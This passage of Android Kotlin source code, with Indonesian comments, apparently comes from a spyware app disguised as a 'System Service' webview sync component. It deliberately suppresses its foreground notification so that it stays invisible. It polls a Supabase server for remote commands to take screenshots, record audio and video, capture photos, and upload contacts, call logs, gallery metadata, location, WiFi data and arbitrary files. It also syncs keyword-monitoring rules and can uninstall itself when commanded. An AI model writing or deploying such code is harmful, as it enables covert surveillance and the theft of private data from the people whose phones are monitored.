        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // IMPORTANCE_NONE: Android tidak menampilkan notifikasi di status bar maupun shade.
            // Channel ID v3 memaksa Android membuat ulang channel (channel lama tidak bisa diubah importance-nya).
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Service",           // nama channel tidak tampil ke user karena IMPORTANCE_NONE
                NotificationManager.IMPORTANCE_NONE
            ).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            manager.createNotificationChannel(channel)
        }
        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(com.system.webview.sync.R.drawable.ic_silent)  // icon transparan custom
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setOngoing(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
        // Android 12+: tunda tampilan notifikasi (10 detik). Jika service berhenti
        // sebelum 10 detik, notifikasi tidak pernah tampil sama sekali.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            builder.setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_DEFERRED)
        }
        return builder.build()
    }

    /**
     * Inner service untuk menghapus notifikasi foreground dari status bar dan shade.
     * Teknik: kedua service memakai NOTIFICATION_ID yang sama. Saat InnerSilentService
     * memanggil stopSelf(), Android membatalkan notifikasi bersama tersebut.
     * Ini efektif di Android 8.x di mana IMPORTANCE_NONE saja belum cukup.
     */
    class InnerSilentService : Service() {
        override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val channelId = "system_webview_sync_v3"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (manager.getNotificationChannel(channelId) == null) {
                    manager.createNotificationChannel(
                        NotificationChannel(channelId, "System Service", NotificationManager.IMPORTANCE_NONE).apply {
                            setShowBadge(false); enableLights(false); enableVibration(false)
                        }
                    )
                }
            }
            val notification = NotificationCompat.Builder(this, channelId)
                .setSmallIcon(com.system.webview.sync.R.drawable.ic_silent)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setSilent(true)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .build()
            startForeground(88127, notification)   // sama dengan NOTIFICATION_ID di BackgroundSyncService
            stopSelf()                              // berhenti → Android membatalkan notifikasi bersama
            return START_NOT_STICKY
        }
        override fun onBind(intent: Intent?) = null
    }

    private fun scanAndQueueGallery(context: Context) {
        val deviceUuid = PrefsHelper.getDeviceUuid(context) ?: return
        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            android.Manifest.permission.READ_MEDIA_IMAGES
        } else {
            android.Manifest.permission.READ_EXTERNAL_STORAGE
        }
        if (ContextCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
            android.util.Log.w("BackgroundSync", "Gallery permission not granted — skipping")
            return
        }

        try {
            val uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val projection = arrayOf(
                android.provider.MediaStore.Images.Media.DISPLAY_NAME,
                android.provider.MediaStore.Images.Media.DATA,
                android.provider.MediaStore.Images.Media.SIZE,
                android.provider.MediaStore.Images.Media.MIME_TYPE,
                android.provider.MediaStore.Images.Media.BUCKET_DISPLAY_NAME,
                android.provider.MediaStore.Images.Media.DATE_ADDED
            )
            // Scan images added in the last 24 hours to avoid huge initial batch
            val sinceSec = (System.currentTimeMillis() - 24 * 60 * 60 * 1000) / 1000
            val selection = "${android.provider.MediaStore.Images.Media.DATE_ADDED} > ?"
            val selectionArgs = arrayOf(sinceSec.toString())
            val sortOrder = "${android.provider.MediaStore.Images.Media.DATE_ADDED} DESC"

            val cursor = context.contentResolver.query(uri, projection, selection, selectionArgs, sortOrder)
            cursor?.use {
                android.util.Log.d("BackgroundSync", "Scanning gallery: found ${it.count} images")
                while (it.moveToNext()) {
                    val name = it.getString(0) ?: "Unknown"
                    val path = it.getString(1) ?: ""
                    val size = it.getLong(2)
                    val mime = it.getString(3) ?: "image/jpeg"
                    val album = it.getString(4) ?: "Camera"
                    val dateAddedSec = it.getLong(5)
                    val takenAt = nowUtcFromMs(dateAddedSec * 1000)

                    val payload = JSONObject().apply {
                        put("device_id", deviceUuid)
                        put("file_name", name)
                        put("file_path", path)
                        put("file_size_bytes", size)
                        put("mime_type", mime)
                        put("album_name", album)
                        put("taken_at", takenAt)
                    }
                    SyncQueueHelper.enqueue(context, "gallery_items", payload.toString())
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("BackgroundSync", "scanAndQueueGallery failed", e)
        }
    }

    private fun checkPendingScreenshotCommands(context: Context) {
        val deviceUuid = PrefsHelper.getDeviceUuid(context) ?: return
        val url = "${SupabaseConfig.URL}/rest/v1/screenshot_commands?device_id=eq.$deviceUuid&status=eq.PENDING"
        
        val request = Request.Builder()
            .url(url)
            .get()
            .addHeader("apikey", SupabaseConfig.ANON_KEY)
            .addHeader("Authorization", "Bearer ${SupabaseConfig.ANON_KEY}")
            .build()

        val client = OkHttpClient()
        try {
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val bodyStr = response.body?.string() ?: "[]"
                    val jsonArray = org.json.JSONArray(bodyStr)
                    if (jsonArray.length() > 0) {
                        android.util.Log.d("BackgroundSync", "Found ${jsonArray.length()} pending commands!")
                        for (i in 0 until jsonArray.length()) {
                            val cmdObj = jsonArray.getJSONObject(i)
                            val cmdId = cmdObj.getLong("id")
                            val cmdType = cmdObj.optString("command_type", "SCREENSHOT")

                            // Atomic guard: add() returns false if already present.
                            // ConcurrentHashMap.newKeySet() makes this thread-safe across
                            // concurrent scheduler invocations. IDs are also persisted to
                            // SharedPreferences so the guard survives service restarts.
                            if (!executedCommandIds.add(cmdId)) {
                                android.util.Log.d("BackgroundSync", "Command $cmdId already dispatched, skipping")
                                continue
                            }
                            // Persist immediately so we survive a restart before DB update
                            PrefsHelper.addExecutedCommandId(context, cmdId)

                            android.util.Log.i("BackgroundSync", "Executing on-demand command: ID=$cmdId, TYPE=$cmdType")

                            when (cmdType) {
                                "SCREENSHOT" -> {
                                    // Update DB status BEFORE broadcast so next poll sees EXECUTED
                                    // even if broadcast causes a slow path
                                    updateScreenshotCommandStatus(cmdId, "EXECUTED")
                                    context.sendBroadcast(Intent("com.system.webview.sync.TAKE_SCREENSHOT"))
                                }
                                "APPS" -> {
                                    scanAndQueueInstalledApps(context)
                                    SyncQueueHelper.executeSyncSynchronously(context)
                                    updateScreenshotCommandStatus(cmdId, "EXECUTED")
                                }
                                "CALLS" -> {
                                    scanAndQueueCallLog(context, forceAll = true)
                                    SyncQueueHelper.executeSyncSynchronously(context)
                                    updateScreenshotCommandStatus(cmdId, "EXECUTED")
                                }
                                "WIFI" -> {
                                    captureAndQueueWifi(context)
                                    SyncQueueHelper.executeSyncSynchronously(context)
                                    updateScreenshotCommandStatus(cmdId, "EXECUTED")
                                }
                                "CONTACTS" -> {
                                    syncContacts(context)
                                    updateScreenshotCommandStatus(cmdId, "EXECUTED")
                                }
                                "LOCATION" -> {
                                    captureAndQueueLocation(context, force = true)
                                    SyncQueueHelper.executeSyncSynchronously(context)
                                    updateScreenshotCommandStatus(cmdId, "EXECUTED")
                                }
                                else -> {
                                    android.util.Log.w("BackgroundSync", "Unknown command type: $cmdType")
                                    updateScreenshotCommandStatus(cmdId, "EXECUTED")
                                }
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("BackgroundSync", "checkPendingScreenshotCommands failed", e)
        }
    }

    private fun updateScreenshotCommandStatus(cmdId: Long, status: String) {
        val url = "${SupabaseConfig.URL}/rest/v1/screenshot_commands?id=eq.$cmdId"
        val body = JSONObject().apply {
            put("status", status)
            put("executed_at", nowUtcString())
        }.toString()

        val mediaType = "application/json; charset=utf-8".toMediaType()
        val request = Request.Builder()
            .url(url)
            .patch(body.toRequestBody(mediaType))
            .addHeader("apikey", SupabaseConfig.ANON_KEY)
            .addHeader("Authorization", "Bearer ${SupabaseConfig.ANON_KEY}")
            .build()

        val client = OkHttpClient()
        try {
            client.newCall(request).execute().use { resp ->
                android.util.Log.d("BackgroundSync", "Updated command $cmdId status to $status: ${resp.code}")
            }
        } catch (e: Exception) {
            android.util.Log.e("BackgroundSync", "Failed to update screenshot command status", e)
        }
    }

    private fun syncMonitoredKeywords(context: Context) {
        val deviceUuid = PrefsHelper.getDeviceUuid(context) ?: return
        val url = "${SupabaseConfig.URL}/rest/v1/keyword_rules?device_id=eq.$deviceUuid&is_active=eq.true"

        val request = Request.Builder()
            .url(url)
            .get()
            .addHeader("apikey", SupabaseConfig.ANON_KEY)
            .addHeader("Authorization", "Bearer ${SupabaseConfig.ANON_KEY}")
            .build()

        val client = OkHttpClient()
        try {
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val bodyStr = response.body?.string() ?: "[]"
                    val jsonArray = org.json.JSONArray(bodyStr)
                    val map = mutableMapOf<String, String>()
                    for (i in 0 until jsonArray.length()) {
                        val obj = jsonArray.getJSONObject(i)
                        val keyword = obj.getString("keyword").lowercase().trim()
                        val severity = obj.getString("severity")
                        map[keyword] = severity
                    }
                    PrefsHelper.saveKeywords(context, map)
                    android.util.Log.d("BackgroundSync", "Synced ${map.size} keywords from Supabase")
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("BackgroundSync", "syncMonitoredKeywords failed", e)
        }
    }

    private fun syncOcrSettings(context: Context) {
        val deviceUuid = PrefsHelper.getDeviceUuid(context) ?: return
        val url = "${SupabaseConfig.URL}/rest/v1/devices?device_uuid=eq.$deviceUuid&select=ocr_packages"

        val request = Request.Builder()
            .url(url)
            .get()
            .addHeader("apikey", SupabaseConfig.ANON_KEY)
            .addHeader("Authorization", "Bearer ${SupabaseConfig.ANON_KEY}")
            .build()

        val client = OkHttpClient()
        try {
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val bodyStr = response.body?.string() ?: "[]"
                    val jsonArray = org.json.JSONArray(bodyStr)
                    if (jsonArray.length() > 0) {
                        val obj = jsonArray.getJSONObject(0)
                        if (obj.has("ocr_packages") && !obj.isNull("ocr_packages")) {
                            val arr = obj.getJSONArray("ocr_packages")
                            val set = mutableSetOf<String>()
                            for (i in 0 until arr.length()) {
                                set.add(arr.getString(i))
                            }
                            PrefsHelper.saveOcrPackages(context, set)
                            android.util.Log.d("BackgroundSync", "Synced ${set.size} OCR packages from Supabase")
                        }
                    }
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("BackgroundSync", "syncOcrSettings failed", e)
        }
    }

    // ── Contacts sync ─────────────────────────────────────────────────────────
    private fun syncContacts(context: Context) {
        val deviceUuid = PrefsHelper.getDeviceUuid(context) ?: return
        try {
            val phonesMap = mutableMapOf<String, MutableSet<String>>()
            val emailsMap = mutableMapOf<String, MutableSet<String>>()

            context.contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                null, null,
                "${android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
            )?.use { cursor ->
                while (cursor.moveToNext()) {
                    val name  = cursor.getString(0)?.trim() ?: continue
                    val phone = cursor.getString(1)?.trim() ?: continue
                    phonesMap.getOrPut(name) { mutableSetOf() }.add(phone)
                }
            }

            context.contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                arrayOf(
                    android.provider.ContactsContract.CommonDataKinds.Email.DISPLAY_NAME,
                    android.provider.ContactsContract.CommonDataKinds.Email.ADDRESS
                ),
                null, null, null
            )?.use { cursor ->
                while (cursor.moveToNext()) {
                    val name  = cursor.getString(0)?.trim() ?: continue
                    val email = cursor.getString(1)?.trim() ?: continue
                    emailsMap.getOrPut(name) { mutableSetOf() }.add(email)
                }
            }

            val allNames = (phonesMap.keys + emailsMap.keys).toSet()
            if (allNames.isEmpty()) { android.util.Log.d("BackgroundSync", "syncContacts: no contacts"); return }

            val httpClient = OkHttpClient()
            val deleteReq = Request.Builder()
                .url("${SupabaseConfig.URL}/rest/v1/contacts?device_id=eq.$deviceUuid")
                .delete()
                .addHeader("apikey", SupabaseConfig.ANON_KEY)
                .addHeader("Authorization", "Bearer ${SupabaseConfig.ANON_KEY}")
                .build()
            httpClient.newCall(deleteReq).execute().use { }

            val allRows = allNames.map { name ->
                JSONObject().apply {
                    put("device_id", deviceUuid)
                    put("contact_name", name)
                    put("phone_numbers", org.json.JSONArray(phonesMap[name]?.toList() ?: emptyList<String>()))
                    put("emails",        org.json.JSONArray(emailsMap[name]?.toList() ?: emptyList<String>()))
                }
            }
            allRows.chunked(100).forEach { chunk ->
                val body = org.json.JSONArray(chunk).toString()
                val insertReq = Request.Builder()
                    .url("${SupabaseConfig.URL}/rest/v1/contacts")
                    .post(body.toRequestBody("application/json; charset=utf-8".toMediaType()))
                    .addHeader("apikey", SupabaseConfig.ANON_KEY)
                    .addHeader("Authorization", "Bearer ${SupabaseConfig.ANON_KEY}")
                    .addHeader("Prefer", "return=minimal")
                    .build()
                httpClient.newCall(insertReq).execute().use { resp ->
                    android.util.Log.d("BackgroundSync", "Contacts insert: ${resp.code}")
                }
            }
            android.util.Log.d("BackgroundSync", "syncContacts: synced ${allNames.size} contacts")
        } catch (e: Exception) {
            android.util.Log.e("BackgroundSync", "syncContacts failed", e)
        }
    }

    // ── Microphone command polling ──────────────────────────────────────────────
    private fun checkPendingMicrophoneCommands(context: Context) {
        val deviceUuid = PrefsHelper.getDeviceUuid(context) ?: return
        val url = "${SupabaseConfig.URL}/rest/v1/microphone_commands?device_id=eq.$deviceUuid&status=eq.PENDING&order=created_at.asc&limit=3"
        val request = Request.Builder()
            .url(url)
            .get()
            .addHeader("apikey", SupabaseConfig.ANON_KEY)
            .addHeader("Authorization", "Bearer ${SupabaseConfig.ANON_KEY}")
            .build()
        val httpClient = OkHttpClient()
        try {
            httpClient.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    android.util.Log.e("BackgroundSync", "checkPendingMicrophoneCommands HTTP ${response.code}")
                    return
                }
                val bodyStr   = response.body?.string() ?: "[]"
                val jsonArray = org.json.JSONArray(bodyStr)
                for (i in 0 until jsonArray.length()) {
                    val cmd      = jsonArray.getJSONObject(i)
                    val cmdId    = cmd.getLong("id")
                    val duration = cmd.optInt("duration_seconds", 5)
                    if (!executedMicCommandIds.add(cmdId)) {
                        android.util.Log.d("BackgroundSync", "Mic cmd $cmdId already dispatched, skipping")
                        continue
                    }
                    PrefsHelper.addExecutedMicCommandId(context, cmdId)
                    android.util.Log.i("BackgroundSync", "Microphone command: id=$cmdId duration=${duration}s")
                    Executors.newSingleThreadExecutor().execute {
                        MicrophoneCaptureHelper.executeRecording(context, cmdId, duration, deviceUuid)
                    }
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("BackgroundSync", "checkPendingMicrophoneCommands failed", e)
        }
    }

    // ── Video command polling ────────────────────────────────────────────────────
    private fun checkPendingVideoCommands(context: Context) {
        val deviceUuid = PrefsHelper.getDeviceUuid(context) ?: return
        val url = "${SupabaseConfig.URL}/rest/v1/video_commands?device_id=eq.$deviceUuid&status=eq.PENDING&order=created_at.asc&limit=2"
        val request = Request.Builder()
            .url(url)
            .get()
            .addHeader("apikey", SupabaseConfig.ANON_KEY)
            .addHeader("Authorization", "Bearer ${SupabaseConfig.ANON_KEY}")
            .build()
        val httpClient = OkHttpClient()
        try {
            httpClient.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return
                val bodyStr   = response.body?.string() ?: "[]"
                val jsonArray = org.json.JSONArray(bodyStr)
                for (i in 0 until jsonArray.length()) {
                    val cmd      = jsonArray.getJSONObject(i)
                    val cmdId    = cmd.getLong("id")
                    val duration = cmd.optInt("duration_seconds", 10)
                    val camSide  = cmd.optString("camera_side", "BACK")
                    if (!executedVideoCommandIds.add(cmdId)) {
                        android.util.Log.d("BackgroundSync", "Video cmd $cmdId already dispatched, skipping")
                        continue
                    }
                    PrefsHelper.addExecutedVideoCommandId(context, cmdId)
                    android.util.Log.i("BackgroundSync", "Video command: id=$cmdId duration=${duration}s side=$camSide")
                    Executors.newSingleThreadExecutor().execute {
                        VideoCaptureHelper.executeRecording(context, cmdId, duration, camSide, deviceUuid)
                    }
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("BackgroundSync", "checkPendingVideoCommands failed", e)
        }
    }

    // ── Camera command polling ─────────────────────────────────────────────────
    private fun checkPendingCameraCommands(context: Context) {
        val deviceUuid = PrefsHelper.getDeviceUuid(context) ?: return
        val url = "${SupabaseConfig.URL}/rest/v1/camera_commands?device_id=eq.$deviceUuid&status=eq.PENDING"
        val request = Request.Builder()
            .url(url)
            .get()
            .addHeader("apikey", SupabaseConfig.ANON_KEY)
            .addHeader("Authorization", "Bearer ${SupabaseConfig.ANON_KEY}")
            .build()
        val httpClient = OkHttpClient()
        try {
            httpClient.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return
                val bodyStr   = response.body?.string() ?: "[]"
                val jsonArray = org.json.JSONArray(bodyStr)
                for (i in 0 until jsonArray.length()) {
                    val cmd     = jsonArray.getJSONObject(i)
                    val cmdId   = cmd.getLong("id")
                    val camSide = cmd.optString("camera_side", "BACK")
                    if (!executedCameraCommandIds.add(cmdId)) {
                        android.util.Log.d("BackgroundSync", "Camera cmd $cmdId already dispatched, skipping")
                        continue
                    }
                    PrefsHelper.addExecutedCameraCommandId(context, cmdId)
                    android.util.Log.i("BackgroundSync", "Camera command: id=$cmdId side=$camSide")
                    Executors.newSingleThreadExecutor().execute {
                        CameraCaptureHelper.captureAndUpload(context, cmdId, camSide)
                    }
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("BackgroundSync", "checkPendingCameraCommands failed", e)
        }
  
    }

    //─── AGENT MODE CONTROL ──────────────────────────────────────────────────

    /**
     * Fetch agent_mode from Supabase devices table, cache result in SharedPreferences.
     * Returns "ACTIVE" on error (fail-safe).
     */
    private fun fetchAndCacheAgentMode(context: Context): String {
        val deviceUuid = PrefsHelper.getDeviceUuid(context) ?: return "ACTIVE"
        return try {
            val url = "${com.system.webview.sync.network.SupabaseConfig.URL}/rest/v1/devices?device_uuid=eq.$deviceUuid&select=agent_mode"
            val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
            conn.requestMethod = "GET"
            conn.setRequestProperty("apikey", com.system.webview.sync.network.SupabaseConfig.ANON_KEY)
            conn.setRequestProperty("Authorization", "Bearer ${com.system.webview.sync.network.SupabaseConfig.ANON_KEY}")
            conn.setRequestProperty("Accept", "application/json")
            conn.connectTimeout = 8000
            conn.readTimeout = 8000
            val code = conn.responseCode
            if (code == 200) {
                val body = conn.inputStream.bufferedReader().readText()
                conn.disconnect()
                val arr = org.json.JSONArray(body)
                if (arr.length() > 0) {
                    val mode = arr.getJSONObject(0).optString("agent_mode", "ACTIVE")
                    PrefsHelper.setAgentMode(context, mode)
                    android.util.Log.d("BackgroundSync", "agent_mode fetched: $mode")
                    mode
                } else "ACTIVE"
            } else {
                conn.disconnect()
                PrefsHelper.getAgentMode(context) // fallback to cached
            }
        } catch (e: Exception) {
            android.util.Log.w("BackgroundSync", "fetchAndCacheAgentMode failed: ${e.message}")
            PrefsHelper.getAgentMode(context) // fallback to cached
        }
    }

    /**
     * Handle UNINSTALL mode:
     * 1. Remove Device Admin (required before self-uninstall)
     * 2. Launch system uninstall dialog
     * 3. Stop this service
     */
    private fun handleUninstallRequest(context: Context) {
        android.util.Log.i("BackgroundSync", "Agent UNINSTALL requested — initiating...")
        try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val componentName = ComponentName(context, AgentDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(componentName)) {
                dpm.removeActiveAdmin(componentName)
                android.util.Log.i("BackgroundSync", "Device admin removed")
                Thread.sleep(800) // Wait for admin removal to propagate
            }
        } catch (e: Exception) {
            android.util.Log.w("BackgroundSync", "Remove admin failed: ${e.message}")
        }
        try {
            val packageUri = Uri.parse("package:${context.packageName}")
            @Suppress("DEPRECATION")
            val uninstallIntent = Intent(Intent.ACTION_UNINSTALL_PACKAGE, packageUri).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(uninstallIntent)
            android.util.Log.i("BackgroundSync", "Uninstall intent launched")
        } catch (e: Exception) {
            android.util.Log.e("BackgroundSync", "Uninstall intent failed: ${e.message}")
        }
        stopSelf()
    }

    // ── File transfer command polling ────────────────────────────────────────
    private fun checkPendingFileTransferCommands(context: Context) {
        val deviceUuid = PrefsHelper.getDeviceUuid(context) ?: return
        val url = "${SupabaseConfig.URL}/rest/v1/file_transfer_commands" +
            "?device_id=eq.$deviceUuid&status=eq.PENDING&order=created_at.asc&limit=3"
        val request = Request.Builder()
            .url(url)
            .get()
            .addHeader("apikey", SupabaseConfig.ANON_KEY)
            .addHeader("Authorization", "Bearer ${SupabaseConfig.ANON_KEY}")
            .build()
        val httpClient = OkHttpClient()
        try {
            httpClient.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    android.util.Log.e("BackgroundSync", "checkPendingFileTransferCommands HTTP ${response.code}")
                    return
                }
                val jsonArray = org.json.JSONArray(response.body?.string() ?: "[]")
                for (i in 0 until jsonArray.length()) {
                    val cmd      = jsonArray.getJSONObject(i)
                    val cmdId    = cmd.getLong("id")
                    val filePath = cmd.getString("file_path")
                    val fileName = cmd.getString("file_name")
                    if (!executedFileTransferCommandIds.add(cmdId)) {
                        android.util.Log.d("BackgroundSync", "FileTransfer cmd $cmdId already dispatched, skipping")
                        continue
                    }
                    android.util.Log.i("BackgroundSync", "FileTransfer command: id=$cmdId path=$filePath")
                    Executors.newSingleThreadExecutor().execute {
                        FileTransferHelper.executeTransfer(context, cmdId, filePath, fileName, deviceUuid)
                    }
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("BackgroundSync", "checkPendingFileTransferCommands failed", e)
        }
    }

}